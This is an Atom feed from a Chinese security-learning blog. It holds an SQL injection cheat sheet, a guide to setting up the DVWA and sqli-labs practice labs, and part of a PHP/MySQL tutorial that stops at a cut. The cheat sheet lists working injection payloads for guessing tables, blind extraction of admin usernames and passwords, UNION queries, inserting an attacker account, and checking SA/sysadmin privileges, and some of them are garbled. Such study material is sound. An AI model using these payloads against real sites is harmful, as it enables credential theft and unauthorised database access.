<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Welcome to My World</title>
  
  <subtitle>BETTER</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-11-10T12:54:22.186Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>LXL</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入语句</title>
    <link href="http://example.com/2020/11/11/SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5/"/>
    <id>http://example.com/2020/11/11/SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5/</id>
    <published>2020-11-10T20:30:22.000Z</published>
    <updated>2020-11-10T12:54:22.186Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-什么是sql注入"><a href="#1-什么是sql注入" class="headerlink" title="1. 什么是sql注入"></a>1. 什么是sql注入</h2><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p><h2 id="2-sql注入类型"><a href="#2-sql注入类型" class="headerlink" title="2. sql注入类型"></a>2. sql注入类型</h2><h4 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h4><h2 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h2><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> </p><p>基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。 </p><h4 id="sql语句原型"><a href="#sql语句原型" class="headerlink" title="sql语句原型"></a>sql语句原型</h4><p> <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p><h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> </p><p>其注入点 name 类型为字符类型，所以叫字符型注入点。</p><h4 id="这一类-SQL-语句原型"><a href="#这一类-SQL-语句原型" class="headerlink" title="这一类 SQL 语句原型"></a>这一类 SQL 语句原型</h4><p> <code>select * from 表名 where name=&#39;admin&#39;</code> </p><p>值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p><p><em>若存在注入</em>，我们可以构造出类似与如下的sql注入语句进行爆破：</p><p><code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> 我们需要将这些烦人的引号给处理掉。</p><h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时<code>没过滤搜索参数</code>，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p><p>此类注入点提交的 SQL 语句，其原形大致为：</p><p><code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code></p><p> <em>若存在注入</em>，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p><blockquote><p>按照数据提交的方式来分类</p></blockquote><h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p><h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p><h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p><h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p><blockquote><p>按照执行效果来分类</p></blockquote><h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p><h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><h3 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p><ol><li>单引号</li><li>双引号</li><li>基于数字型注入</li></ol><h3 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p><h4 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h4><h5 id="1-判断有无注入点"><a href="#1-判断有无注入点" class="headerlink" title="1.判断有无注入点"></a>1.判断有无注入点</h5><p>; and 1=1 and 1=2</p><h5 id="2-猜表一般的表的名称无非是"><a href="#2-猜表一般的表的名称无非是" class="headerlink" title="2.猜表一般的表的名称无非是"></a>2.猜表一般的表的名称无非是</h5><p>admin adminuser user pass password 等.. </p><p>and 0&lt;&gt;(select count(*) from <em>)<br>and 0&lt;&gt;(select count(</em>) from admin) —判断是否存在admin这张表</p><h5 id="3-猜帐号数目"><a href="#3-猜帐号数目" class="headerlink" title="3.猜帐号数目"></a>3.猜帐号数目</h5><p>如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个<br>and 0&lt;(select count(<em>) from admin)<br>and 1&lt;(select count(</em>) from admin)</p><h5 id="4-猜解字段名称"><a href="#4-猜解字段名称" class="headerlink" title="4.猜解字段名称"></a>4.猜解字段名称</h5><p> 在len( ) 括号里面加上我们想到的字段名称.<br>and 1=(select count(<em>) from admin where len(</em>)&gt;0)–<br>and 1=(select count(<em>) from admin where len(用户字段名称name)&gt;0)<br>and 1=(select count(</em>) from admin where len(_blank&gt;密码字段名称password)&gt;0)</p><h5 id="5-猜解各个字段的长度"><a href="#5-猜解各个字段的长度" class="headerlink" title="5.猜解各个字段的长度"></a>5.猜解各个字段的长度</h5><p>猜解长度就是把&gt;0变换 直到返回正确页面为止<br>and 1=(select count(<em>) from admin where len(</em>)&gt;0)<br>and 1=(select count(<em>) from admin where len(name)&gt;6) 错误<br>and 1=(select count(</em>) from admin where len(name)&gt;5) 正确 长度是6<br>and 1=(select count(*) from admin where len(name)=6) 正确</p><p>and 1=(select count(<em>) from admin where len(password)&gt;11) 正确<br>and 1=(select count(</em>) from admin where len(password)&gt;12) 错误 长度是12<br>and 1=(select count(*) from admin where len(password)=12) 正确</p><h5 id="6-猜解字符"><a href="#6-猜解字符" class="headerlink" title="6.猜解字符"></a>6.猜解字符</h5><p>and 1=(select count(<em>) from admin where left(name,1)=a) —猜解用户帐号的第一位<br>and 1=(select count(</em>) from admin where left(name,2)=ab)—猜解用户帐号的第二位<br>就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了<br>and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) –<br>这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</p><p>group by users.id having 1=1–<br>group by users.id, users.username, users.password, users.privs having 1=1–<br>; insert into users values( 666, attacker, foobar, 0xffff )–</p><p>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable-<br>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p><p>&gt;_id)-<br>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p><p>&gt;_id,login_blank&gt;_name)-<br>UNION SELECT TOP 1 login_blank&gt;_name FROM logintable-<br>UNION SELECT TOP 1 password FROM logintable where login_blank&gt;_name=Rahul–</p><p>看_blank&gt;服务器打的补丁=出错了打了SP4补丁<br>and 1=(select @@VERSION)–</p><p>看_blank&gt;数据库连接账号的权限，返回正常，证明是_blank&gt;服务器角色sysadmin权限。<br>and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin))–</p><p>判断连接_blank&gt;数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）<br>and sa=(SELECT System_blank&gt;_user)–<br>and user_blank&gt;_name()=dbo–<br>and 0&lt;&gt;(select user_blank&gt;_name()–</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-什么是sql注入&quot;&gt;&lt;a href=&quot;#1-什么是sql注入&quot; class=&quot;headerlink&quot; title=&quot;1. 什么是sql注入&quot;&gt;&lt;/a&gt;1. 什么是sql注入&lt;/h2&gt;&lt;p&gt;通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最</summary>
      
    
    
    
    
    <category term="-sql" scheme="http://example.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>DVWA和SQL注入靶场搭建</title>
    <link href="http://example.com/2020/10/24/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2020/10/24/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</id>
    <published>2020-10-24T10:30:12.000Z</published>
    <updated>2020-10-24T07:43:18.967Z</updated>
    
    <content type="html"><![CDATA[<p>陆续搭建了两个靶场，以下为搭建过程</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><h6 id="安装-PHPstudy"><a href="#安装-PHPstudy" class="headerlink" title="安装 PHPstudy"></a>安装 PHPstudy</h6><p>phpStudy是一个PHP调试环境的程序集成包。恰好我们可以用到”PHP+Mysql+Apache”。</p><p>  官网地址</p><h6 id="安装sqil-labs"><a href="#安装sqil-labs" class="headerlink" title="安装sqil-labs"></a>安装sqil-labs</h6><p>SQLi-Labs是一个专业的SQL注入练习平台，适用于GET和POST场景，包含了以下注入：</p><p>下载地址</p><p>下载完成后将sqli-labs解压至PHPstudy文件中的www文件内</p><p>比如<br>$$<br>D:\phpStudy\WWW\”<br>$$</p><h5 id="修改sqli-labs参数"><a href="#修改sqli-labs参数" class="headerlink" title="修改sqli-labs参数"></a>修改sqli-labs参数</h5><p>在准备工作完成后</p><p>接下来就是修改sqli-labs文件中的参数</p><p>​       进入sqli-labs文件</p><p>​       来到最下面的页面</p><p>​       可以找到最后一个文件夹，名为sql-connection</p><p>​      用记事本打开文件中的<strong>db-creds.inc</strong></p><p>​      添加密码root</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbpass &#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure><p>接下来直接浏览器打开<strong><a href="http://127.0.0.1/sqli-labs/">http://127.0.0.1/sqli-labs/</a></strong></p><p>点击<strong>Setup/reset Database</strong>”创建数据库，创建表并填充数据</p><p>返回**<a href="http://127.0.0.1/sqli-labs/**%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%90%91%E4%B8%8B%E7%BF%BB%E5%8D%B3%E5%AE%8C%E6%88%90%E3%80%82">http://127.0.0.1/sqli-labs/**页面，向下翻即完成。</a></p><h4 id="DVWA靶场搭建"><a href="#DVWA靶场搭建" class="headerlink" title="DVWA靶场搭建"></a>DVWA靶场搭建</h4><h5 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h5><p>这个同样需要下载phpstudy</p><p>下载完成后，打开PHPstudy并启动Apache和MySQL</p><p>在浏览器中输入自己的IP地址</p><p>将会出现站点搭建成功的字样。</p><h5 id="MySQL环境变量配置"><a href="#MySQL环境变量配置" class="headerlink" title="MySQL环境变量配置"></a>MySQL环境变量配置</h5><p>进入PHPstudy安装目录下复制地址</p><p>打开我的电脑，进入属性，打开高级系统配置。</p><p>点击环境变量</p><p>双击path</p><p>添加复制的MySQL目录的地址</p><h5 id="检验"><a href="#检验" class="headerlink" title="检验"></a>检验</h5><p>启动命令提示符（cmd)</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root-t</span><br></pre></td></tr></table></figure><p>得到回应后，输入MySQL密码（一般来说，初始密码都是root）</p><h5 id="DVWA靶机配置"><a href="#DVWA靶机配置" class="headerlink" title="DVWA靶机配置"></a>DVWA靶机配置</h5><p>官网下载响应靶机包</p><p>解压并修改文件名称为DVWA</p><p>将其放入之前PHPstudy的www文件夹中。</p><p>修改配置文件(config.inc.php.dist)</p><p>将文件重命名，把后缀删掉</p><p>并用记事本打开文件，修改其中MySQL数据库密码，（一般是root）</p><h5 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h5><p>在浏览器中输入IP地址/DVWA</p><p>打开页面后，点击最下方创建数据库。</p><p>完成后即可登录</p><p>初始账号为admin</p><p>初始密码为password</p><p>登录成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;陆续搭建了两个靶场，以下为搭建过程&lt;/p&gt;
&lt;h4 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h4&gt;&lt;h5 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=</summary>
      
    
    
    
    
    <category term="靶场搭建" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>PHP数据库</title>
    <link href="http://example.com/2020/10/19/PHP%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://example.com/2020/10/19/PHP%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2020-10-18T19:46:09.000Z</published>
    <updated>2020-10-18T13:17:07.555Z</updated>
    
    <content type="html"><![CDATA[<h2 id="连接-MySQL"><a href="#连接-MySQL" class="headerlink" title="连接 MySQL"></a>连接 MySQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;username&quot;;</span><br><span class="line">$password &#x3D; &quot;password&quot;;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 创建连接</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password);</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 检测连接</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;连接失败: &quot; . $conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line">echo &quot;连接成功&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><p><strong>注意：</strong> 当你创建一个新的数据库时，你必须为 mysqli 对象指定三个参数 (servername, username 和  password)</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;username&quot;;</span><br><span class="line">$password &#x3D; &quot;password&quot;;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 创建连接</span><br><span class="line">$conn &#x3D; mysqli_connect($servername, $username, $password);</span><br><span class="line">&#x2F;&#x2F; 检测连接</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;连接失败: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 创建数据库</span><br><span class="line">$sql &#x3D; &quot;CREATE DATABASE myDB&quot;;</span><br><span class="line">if (mysqli_query($conn, $sql)) &#123;</span><br><span class="line">    echo &quot;数据库创建成功&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Error creating database: &quot; . mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意</p><table><thead><tr><th>函数</th><th>作用/含义</th></tr></thead><tbody><tr><td>PHP mysqli_connect() 函数</td><td>打开一个到 MySQL 服务器的新的连接。</td></tr><tr><td>mysqli_query() 函数</td><td>执行某个针对数据库的查询。</td></tr><tr><td>mysqli_error() 函数</td><td>返回最近调用函数的最后一个错误描述。</td></tr><tr><td>mysqli_connect_error() 函数</td><td>返回上一次连接错误的错误描述。</td></tr></tbody></table><h1 id="PHP-创建-MySQL-表"><a href="#PHP-创建-MySQL-表" class="headerlink" title="PHP 创建 MySQL 表"></a>PHP 创建 MySQL 表</h1><p>CREATE TABLE 语句用于创建 MySQL 表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use myDB;&#x2F;&#x2F;选择要操作的数据库</span><br></pre></td></tr></table></figure><p>将创建一个名为myguests的表格</p><hr><p>CREATE TABLE MyGuests</p><p> (   </p><p> id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </p><p>   firstname VARCHAR(30) NOT NULL,  </p><p> lastname VARCHAR(30) NOT NULL,    </p><p>email VARCHAR(50),   </p><p> reg_date TIMESTAMP</p><p> )</p><hr><p>数据类型指定列可以存储什么类型的数据</p><ul><li>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。</li><li>DEFAULT value - 设置默认值</li><li>UNSIGNED - 使用无符号数值类型，0 及正数 </li><li>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1</li><li>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的 PRIMARY KEY 设置为 ID 数值，与 AUTO_INCREMENT 一起使用。</li></ul><p>[^]: 每个表都应该有一个主键(本列为 “id” 列)，主键必须包含唯一的值。</p><h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;username&quot;;</span><br><span class="line">$password &#x3D; &quot;password&quot;;</span><br><span class="line">$dbname &#x3D; &quot;myDB&quot;;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 创建连接</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">&#x2F;&#x2F; 检测连接</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;连接失败: &quot; . $conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 使用 sql 创建数据表</span><br><span class="line">$sql &#x3D; &quot;CREATE TABLE MyGuests (</span><br><span class="line">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span><br><span class="line">firstname VARCHAR(30) NOT NULL,</span><br><span class="line">lastname VARCHAR(30) NOT NULL,</span><br><span class="line">email VARCHAR(50),</span><br><span class="line">reg_date TIMESTAMP</span><br><span class="line">)&quot;;</span><br><span class="line"> </span><br><span class="line">if ($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE) &#123;</span><br><span class="line">    echo &quot;Table MyGuests created successfully&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;创建数据表错误: &quot; . $conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$conn-&gt;close();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="PHP-MySQL-插入数据"><a href="#PHP-MySQL-插入数据" class="headerlink" title="PHP  MySQL 插入数据"></a>PHP  MySQL 插入数据</h1><p>向表中添加数据</p><p>语法规则</p><ul><li><p>PHP 中 SQL 查询语句必须使用引号</p></li><li><p>在 SQL 查询语句中的字符串值必须加引号</p></li><li><p>数值的值不需要引号</p></li><li><p>NULL 值不需要引号</p><h5 id="INSERT-INTO-语句"><a href="#INSERT-INTO-语句" class="headerlink" title="INSERT INTO 语句"></a>INSERT INTO 语句</h5><p>INSERT INTO 语句通常用于向 MySQL 表添加新的记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, column3,...)</span><br><span class="line">VALUES (value1, value2, value3,...)</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line">VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;)&quot;;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="插入多条数据"><a href="#插入多条数据" class="headerlink" title="插入多条数据"></a>插入多条数据</h5><p>mysqli_multi_query() 函数</p><p>用途   执行多条SQL语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (mysqli_multi_query($conn, $sql)) &#123;</span><br><span class="line">    echo &quot;新记录插入成功&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li></ul><h5 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h5><p>  mysql 扩展可以不带数据发送语句或查询到mysql数据库。</p><p>  实例</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$stmt &#x3D; mysqli_stmt_init($conn);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;预处理语句</span><br><span class="line">    if (mysqli_stmt_prepare($stmt, $sql)) &#123;</span><br><span class="line">        &#x2F;&#x2F; 绑定参数</span><br><span class="line">        mysqli_stmt_bind_param($stmt, &#39;sss&#39;, $firstname, $lastname, $email);</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; 设置参数并执行</span><br><span class="line">        $firstname &#x3D; &#39;John&#39;;</span><br><span class="line">        $lastname &#x3D; &#39;Doe&#39;;</span><br><span class="line">        $email &#x3D; &#39;john@example.com&#39;;</span><br><span class="line">        mysqli_stmt_execute($stmt);</span><br><span class="line"> </span><br><span class="line">        $firstname &#x3D; &#39;Mary&#39;;</span><br><span class="line">        $lastname &#x3D; &#39;Moe&#39;;</span><br><span class="line">        $email &#x3D; &#39;mary@example.com&#39;;</span><br><span class="line">        mysqli_stmt_execute($stmt);</span><br><span class="line"> </span><br><span class="line">        $firstname &#x3D; &#39;Julie&#39;;</span><br><span class="line">        $lastname &#x3D; &#39;Dooley&#39;;</span><br><span class="line">        $email &#x3D; &#39;julie@example.com&#39;;</span><br><span class="line">        mysqli_stmt_execute($stmt);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><pre><code> 预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 &quot;?&quot; 标记 。</code></pre>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</span><br></pre></td></tr></table></figure><p>  数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。</p><p>  执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。</p><h2 id="从-MySQL-数据库读取数据"><a href="#从-MySQL-数据库读取数据" class="headerlink" title="从 MySQL 数据库读取数据"></a>从 MySQL 数据库读取数据</h2><p>SELECT 语句用于从数据表中读取数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name</span><br></pre></td></tr></table></figure><p>使用 * 号来读取所有数据表中的字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name</span><br></pre></td></tr></table></figure><p>[^注意]: mysql_num_rows() 函数返回结果集中行的数目。此命令仅对 SELECT 语句有效。</p><h5 id="WHERE语句"><a href="#WHERE语句" class="headerlink" title="WHERE语句"></a>WHERE语句</h5><p>WHERE 子句用于提取满足指定标准的的记录。</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name operator value</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; mysqli_query($con,&quot;SELECT * FROM Persons</span><br><span class="line">WHERE FirstName&#x3D;&#39;Peter&#39;&quot;);</span><br><span class="line"></span><br><span class="line">while($row &#x3D; mysqli_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    echo $row[&#39;FirstName&#39;] . &quot; &quot; . $row[&#39;LastName&#39;];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输出所有 FirstName=’Peter’ 的行</p><h5 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h5><p>ORDER 